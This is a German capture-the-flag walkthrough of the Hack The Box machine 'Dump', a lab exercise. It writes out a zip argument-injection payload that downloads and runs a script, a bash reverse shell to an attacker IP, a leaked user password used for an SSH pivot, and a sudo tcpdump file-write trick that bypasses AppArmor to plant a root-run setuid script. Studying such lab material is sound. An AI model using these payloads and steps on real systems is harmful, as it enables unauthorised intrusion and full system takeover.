# Hack The Box - Dump (Deutsches Walkthrough)

## Synopsis

Dump ist eine Hard-Linux-Maschine mit Fokus auf Argument Injection, AppArmor-Bypass und Privilege Escalation über missbrauchbare `tcpdump`-`sudo`-Rechte.

Initial wird eine benutzerdefinierte PHP-Anwendung über Command Argument Injection im `zip`-Aufruf kompromittiert. Dadurch wird Remote Code Execution als `www-data` erreicht. Nach Enumeration führt ein SQLite-Credential-Leak zu lateralem Zugriff als `fritz`. Anschließend wird eine restriktive `tcpdump`-`sudo`-Regel trotz AppArmor über arbitrary file writes missbraucht, um ein bösartiges `update-motd.d`-Skript zu platzieren, das beim SSH-Login als Root ausgeführt wird.

## Enumeration

### Nmap

```text
nmap -Pn -A --top-ports 3000 dump.vl
```

**Interessante Dienste:**
- 22/tcp SSH
- 80/tcp HTTP

**Hosts ergänzen:**
```text
echo '10.129.x.x dump.vl' | sudo tee -a /etc/hosts
```

## Web Enumeration

**Ferox:**
```text
feroxbuster -u http://dump.vl -w ~/wordlists/raft-medium-words.txt -q -C 403
```

**Treffer:**
- `/downloads/`
- `.functions.php`

**Web-App Features:**
- Upload von `.pcap`
- Download als ZIP
- Live Packet Capture

SQLi erfolglos, Upload-Filter blockt Webshells.

## Initial Access

### Command Argument Injection

**Download-Funktion liefert:**
```text
zip warning: name not matched: *
zip error: Nothing to do!
```

Das bestätigt eine Backend-Nutzung von `zip`.

**Test mit Dateiname:**
- `-h`

Dadurch erscheint das ZIP-Help-Menü. Argument Injection bestätigt.

**Zip erlaubt:**
- `-T`
- `-TT cmd`

**Payload wird über mehrere Uploads gesplittet. Ergebnis:**
```text
zip '-T' '-TT wget -r LHOST:8000 -nd;bash s.sh;echo' archive.zip test
```

**Payload:**
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.66/10001 0>&1
```

**HTTP Server:**
```text
python3 -m http.server 8000
```

**Listener:**
```text
nc -lvnp 10001
```

Trigger über Download-Button.

**Shell:**
- `www-data@dump`

## Lateral Movement

**Sudo Rechte prüfen:**
```text
sudo -l
```

**SQLite prüfen:**
```text
sqlite3 database.sqlite3 'select * from users'
```

**Leak:**
```text
fritz|Passw0rdH4shingIsforNoobZ!
```

**SSH Pivot:**
```text
ssh fritz@dump.vl
```

### AppArmor Analyse

Direkte GTFOBins-Exec schlägt fehl.

**Profil prüfen:**
```text
cat /etc/apparmor.d/usr.bin.tcpdump
```

**Wichtig:**
- erlaubt `*.pcap`
- erlaubt `*.cap`
- erlaubt UUID-formatierte Pfade im Home-Bereich
- für `-z` nur `gzip` und `bzip2`

Direkter Exec bleibt blockiert.

## Privilege Escalation

### Arbitrary File Write via tcpdump

**Ziel:**
```text
/etc/update-motd.d/
```

**Datei mit UUID-Namen schreiben:**
```text
sudo /usr/bin/tcpdump -c 10 \
  -w /etc/update-motd.d/11111111-1234-1234-1234-111111111111 \
  -Z fritz \
  -r /351ecea1-0311-49de-97d9-f3a56970fae8 \
  -F /var/cache/captures/filter.351ecea1-0311-49de-97d9-f3a56970fae8
```

**Datei vorhanden:**
```text
ls -lah /etc/update-motd.d/11111111-1234-1234-1234-111111111111
```

**Payload injizieren:**
```bash
#!/bin/bash
cp /usr/bin/bash /home/fritz/bash && chmod u+s /home/fritz/bash
```

**Executable machen:**
```text
chmod +x /etc/update-motd.d/11111111-1234-1234-1234-111111111111
```

**Root Trigger:**
```text
ssh fritz@dump.vl
```

Beim neuen Login wird das Skript ausgeführt.

**Root Shell:**
```text
./bash -p
id
cat /root/root.txt
```

## Angriffskette Kurzüberblick

- ZIP Argument Injection
- Reverse Shell als `www-data`
- SQLite Credential Leak
- SSH Pivot als `fritz`
- AppArmor Analyse
- Arbitrary File Write via `tcpdump`
- `update-motd.d` Abuse
- Root
